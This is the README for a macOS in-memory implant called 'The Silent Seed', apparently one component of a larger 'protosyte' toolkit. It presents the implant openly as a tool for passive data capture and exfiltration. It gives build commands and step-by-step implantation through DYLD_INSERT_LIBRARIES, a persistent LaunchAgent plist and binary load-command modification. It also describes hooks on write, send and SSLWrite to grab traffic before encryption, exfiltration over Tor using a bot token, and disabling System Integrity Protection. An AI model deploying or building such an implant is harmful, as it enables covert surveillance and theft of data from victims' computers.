# Component A: The Silent Seed (macOS)

macOS dynamic library-based in-memory implant for passive data capture and exfiltration.

## Building

```bash
# Build as macOS dynamic library
cargo build --release --target x86_64-apple-darwin

# Or for Apple Silicon
cargo build --release --target aarch64-apple-darwin
```

## Implantation Methods

### Method 1: DYLD_INSERT_LIBRARIES (Equivalent to LD_PRELOAD)
```bash
# For a single command
DYLD_INSERT_LIBRARIES=/path/to/libprotosyte.dylib /path/to/target_app

# For all processes (requires SIP disabled)
export DYLD_INSERT_LIBRARIES=/path/to/libprotosyte.dylib
```

### Method 2: LaunchDaemon/LaunchAgent
```xml
<!-- ~/Library/LaunchAgents/com.protosyte.plist -->
<plist>
  <dict>
    <key>ProgramArguments</key>
    <array>
      <string>/path/to/target_app</string>
    </array>
    <key>EnvironmentVariables</key>
    <dict>
      <key>DYLD_INSERT_LIBRARIES</key>
      <string>/path/to/libprotosyte.dylib</string>
    </dict>
  </dict>
</plist>
```

### Method 3: Function Interposing
```bash
# Use interpose library mechanism
# Modify target binary's load commands
```

## macOS-Specific Features

- Uses POSIX shared memory (shm_open)
- Hooks macOS functions (write, send, SSLWrite)
- Integrates with LaunchDaemon/LaunchAgent
- Supports Tor service (port 9050)

## Configuration

Bot token and endpoints via environment variables:
- `PROTOSYTE_BOT_TOKEN`
- `PROTOSYTE_PASSPHRASE`

## Requirements

- macOS 10.12+ (x86_64 or ARM64)
- Tor running (via Homebrew or Tor Browser)
- May require SIP (System Integrity Protection) to be disabled for some methods

## Security Note

macOS System Integrity Protection (SIP) may prevent library injection.
Some methods require SIP to be disabled, which reduces system security.

